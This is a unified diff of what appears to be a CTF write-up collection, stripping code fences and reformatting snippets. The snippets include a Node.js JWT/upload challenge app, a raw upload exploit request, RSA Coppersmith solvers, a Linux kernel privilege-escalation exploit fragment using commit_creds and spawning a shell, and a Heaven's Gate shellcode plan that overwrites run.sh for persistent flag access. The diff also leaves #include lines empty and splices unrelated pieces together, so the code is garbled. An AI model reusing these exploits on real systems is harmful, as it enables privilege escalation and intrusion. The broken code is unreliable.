@@ -100,7 +100,8 @@ var privateKey = fs.readFileSync('./config/private.pem');    // jwt加�
 router.post('/login', function(req, res, next) {
   const token = jwt.sign({ username: req.body.username, isAdmin: false, home: req.body.username }, privateKey, { algorithm: "RS256" });
   res.send({
-    status:200,
+    status:
+200,
     msg:"success",
     token
   })
@@ -294,12 +295,12 @@ for s in range(20):
 #include <err.h>
 #include <errno.h>
 #include <fcntl.h>
-#include <inttypes.h>
+#include 
 #include <sched.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
-#include <unistd.h>
+#include 
 #include <net/if.h>
 #include <netinet/in.h>
 #include <sys/ipc.h>
@@ -659,11 +660,6 @@ var server = app.listen(8000, function () {
 
   console.log("Application instance, the access address is http://%s:%s", host, port)
 });
-```
-
-
-
-```
 app.use(function(req, res, next) {    // 这一中间件对get、post，auth的数据进行过滤，过滤了危险字符和关键字
   if([req.body, req.query, req.auth, req.headers].some(function(item) {
       console.log(req.auth)
@@ -674,11 +670,6 @@ app.use(function(req, res, next) {    // 这一中间件对get、post，
       next();
   };
 });
-```
-
-
-
-```
 var express = require('express');
 var fs = require("fs");
 var jwt = require("jsonwebtoken");
@@ -691,7 +682,8 @@ var privateKey = fs.readFileSync('./config/private.pem');    // jwt加�
 router.post('/login', function(req, res, next) {
   const token = jwt.sign({ username: req.body.username, isAdmin: false, home: req.body.username }, privateKey, { algorithm: "RS256" });
   res.send({
-    status:200,
+    status:
+200,
     msg:"success",
     token
   })
@@ -728,11 +720,6 @@ router.post('/upload', function(req, res, next) {
 });
 
 module.exports = router;
-```
-
-
-
-```
 var express = require('express');
 var fs = require("fs");
 var jwt = require("jsonwebtoken");
@@ -762,11 +749,6 @@ var server = app.listen(8000, function () {
 
     console.log("Application instance, the access address is http://%s:%s", host, port)
   });
-```
-
-
-
-```
 POST /upload HTTP/1.1
 Host: host
 User-Agent: python-requests/2.27.1
@@ -796,11 +778,6 @@ var server = app.listen(8000, function () {
     console.log("Application instance, the access address is http://%s:%s", host, port)
 });
 --e6a70575f2b3431196ed9ea9baa5f630--
-```
-
-
-
-```
 from Crypto.Util.number import *
 from libnum import *
 
@@ -831,11 +808,6 @@ for i in range(4):
 root = f.small_roots(X=2^464, epsilon=0.03)[0]
 m = m(root)
 print(long_to_bytes(int(m)))
-```
-
-
-
-```
 from Crypto.Util.number import *
 
 N = [7834852404690613421430169663612203646364286385985089874202019066309609197617451690988793560462179054987116479700769830549608039683656465594954511680417439827884682514137395099618980184523220683344996556134367140942117294093697944691881733841814807163442986266436501188979024846961439278137438956993286762327, 56294620872968718380397963653042708970679997991074373308327166468889019728428695832974471693865711660199765275543574607777072876711036238547682259596299830777636017508061107901637637285281716996357267778844219142268259492772365960388947511378141363201796810931407918179374553857261098454741363722931008506489, 129957982988172364798440102561140523140644973971267372222458834449933213209554347296288675182049584297578956734950355730140774286965046426714693180361079049463593214844598178841579717839460125946223610814809560801920675773424029429584993267487434123215947150197664528709696606034737478716163854006621716785991, 9066055260883591502053070869551945047692654206920946891326048741423436599435774484763722715368827203845612354403468594494511688795068051140777669329826790833884137019297335832118519149000495203691914082887641717032244953119788416874814325467577437200429867014461247963978079935867875238778711836684201288629]
@@ -863,33 +835,28 @@ for s in range(20):
                 print(s,i,j,ans)
                 for k in ans:
                     print(long_to_bytes(x0+k))
-```
-
-
-
-```
-#define _GNU_SOURCE
-#include <err.h>
-#include <errno.h>
-#include <fcntl.h>
-#include <inttypes.h>
-#include <sched.h>
-#include <stdio.h>
-#include <stdlib.h>
-#include <string.h>
-#include <unistd.h>
-#include <net/if.h>
-#include <netinet/in.h>
-#include <sys/ipc.h>
-#include <sys/msg.h>
-#include <sys/socket.h>
-#include <sys/syscall.h>
-#include <linux/netfilter_ipv4/ip_tables.h>
-#include <stdint.h>
-#include <sys/mman.h>
-#include <signal.h>
-#include <sys/prctl.h>
-#define SIZE 0x60
+    #define _GNU_SOURCE
+    #include <err.h>
+    #include <errno.h>
+    #include <fcntl.h>
+    #include 
+    #include <sched.h>
+    #include <stdio.h>
+    #include <stdlib.h>
+    #include <string.h>
+    #include 
+    #include <net/if.h>
+    #include <netinet/in.h>
+    #include <sys/ipc.h>
+    #include <sys/msg.h>
+    #include <sys/socket.h>
+    #include <sys/syscall.h>
+    #include <linux/netfilter_ipv4/ip_tables.h>
+    #include <stdint.h>
+    #include <sys/mman.h>
+    #include <signal.h>
+    #include <sys/prctl.h>
+    #define SIZE 0x60
 size_t user_cs, user_ss, user_rflags, user_sp;
 size_t commit_creds = 0, prepare_kernel_cred = 0;
 size_t vmlinux_base = 0;
@@ -1108,60 +1075,25 @@ int main(){
     spawn_shell();
 
 }
-```
-
-
-
-```
 __int64 sub_7F9()
 {
   close(1);
   close(2);
   return sub_7CA();
 }
-```
-
-
-
-```
 1.需要用到天堂之门切换位数绕过系统调用号检测，在这之前需要用mmap开启一段可执行空间，直接在栈上执行天堂之门会无法执行
 2.在mmap出来的区段写上32 to 64的天堂之门shellcode然后open flag 和run.sh(或者pwn文件)
 接着再用64 to 32的天堂之门切换到64位把flag读入到mmap区段，再接着切换到32位把flag write到run.sh(或者pwn文件)
 3.由于程序有Xinetd守护进程，不会导致容器重置，下次nc直接get flag
-```
-
-
-
-```
 08049857                 cmovnz  edx, edi
-```
-
-
-
-```
 0804990D                 xor     [eax+edx*4+10h], ecx
-```
-
-
-
-```
 [0, 10, 7, 1, 29, 37, 9, 8, 1, 20, 7, 
     18, 28, 51, 33, 19, 3, 21, 21, 3, 2, 47, 18, 37, 9, 20, 20, 3, 5, 18, 10, 10, 31, 27]
-```
-
-
-
-```
 >>> arr = [0, 10, 7, 1, 29, 37, 9, 8, 1, 20, 7,
 ...     18, 28, 51, 33, 19, 3, 21, 21, 3, 2, 47, 18, 37, 9, 20, 20, 3, 5, 18, 10, 10, 31, 27]
 >>> flag = bytes([each ^ 0x66 for each in arr])
 >>> flag
 b'flag{CongratzUGuessedItCorrectlly}'
-```
-
-
-
-```
 003480CD     | 8B4D 08           | mov ecx,dword ptr ss:[ebp+8]                |
 003480D0     | C70424 0A000000   | mov dword ptr ss:[esp],A                    | A:'n'
 003480D7     | 894C24 04         | mov dword ptr ss:[esp+4],ecx                |
@@ -1172,11 +1104,6 @@ b'flag{CongratzUGuessedItCorrectlly}'
 003480E8     | C3                | ret                                         |
 003480E9     | 0F1F80 00000000   | nop dword ptr ds:[eax],eax                  |
 003480F0     | E9 A1803000       | jmp truevm.650196                         |
-```
-
-
-
-```
 .truevm.exe
 ef631455b1274f21a6c26f87332d8a22
 Correct
